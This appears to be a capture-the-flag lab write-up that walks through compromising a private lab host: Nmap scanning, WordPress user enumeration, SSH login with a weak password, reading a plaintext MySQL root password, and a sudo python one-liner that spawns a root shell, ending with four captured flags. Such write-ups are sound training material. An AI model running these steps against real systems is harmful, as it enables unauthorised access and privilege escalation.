# Red Team: Summary of Operations
### Table of Contents
 - Exposed Services
 - Critical Vulnerabilities
 - Exploitation
### Exposed Services
- Fill out the information below:
  - Nmap scan results for each machine reveal the below services and OS details: nmap -sV 192.168.1.110  command to Scan Target 1
  
 ![](Images/Nmap%20Scan.png)
 
- This scan identifies the services below as potential points of entry:
 ### Target 1:
  - SSH
  - HTTP
  - rpcbind
  - netbios-ssn
  
  ![](Images/Nmap%20Port%20%26%20Services.png)



- The following vulnerabilities were identified on each target:
 ### Target 1:


| Vulnerability        | Description                                                                                                                                                      | Impact                              | CVE or Standard |
|----------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------|-----------------|
| Port Scanning        | Use Nmap to detect open ports                                                                                                                                    | Show vulnerable ports and services. | Standard        |
| Enumerate WordPress  | Exhibit different behavior for a failed login attempt depending on whether the user account exists, which allows remote  attackers to enumerate valid usernames. | Enumerate User Accounts             | CVE-2009-2335   |
| Weak Password        | Using easily guess passwords                                                                                                                                     | Gain access to the machine          | Standard        |
| Privilege Escalation | when running with Python 3.6 or later,  allows remote authenticated users to execute  arbitrary code, leading to privilege escalation.                           | Gain root access to the machine     | CVE-2020-29396  |

![](Images/wordpress%201.png)
![](Images/wordpress%202.png)


### Exploitation

- Fill out the details below. Include screenshots where possible:
- The Red Team was able to penetrate Target 1 and retrieve the following confidential data:
### Target 1:

- Exploit Used:
  - weak password
  - ssh michael@192.168.1.110
  - cd /var/www/
  - grep -RE flag



                                      flag1.txt: flag1{b9bbcb33e11b80be759c4e844862482d}
 
 
![](Images/Flag%201%20%26%202.png) 

- Exploit Used:
  - weak password
  - ssh michael@192.168.1.110
  - cd /var/www/html/wordpress
  - mysql -u root -p
  - R@v3enSecurity
  - SELECT * FROM wp_post
 
                                      flag2.txt: flag2{fc3fd58dcdad9ab23faca6e9a36e581c}


![](Images/Flag%201%20%26%202.png)

- Exploit Used:
  - weak password
  - ssh michael@192.168.1.110
  - mysql -u root -p
  - R@v3enSecurity
  - use wordpress;
  - SELECT * FROM wp_posts;

                                          

                                      flag3.txt: flag3{afc01ab56b50591e7dccf93122770cd2} 


 ![](Images/Flag%203.png)
 
 - Exploit Use:
   - Privilege escalation
   - ssh steven@192.168.1.110
   - sudo python -c ‘import os;os.system(“/bin/sh”)’ 
   - cd ../..
   - cat flag4                  
 

                                      flag4.txt:  flag4{715dea6c055b9fe3337544932f2941ce}
 
 
![](Images/Flag%204.png)
                                      
                   



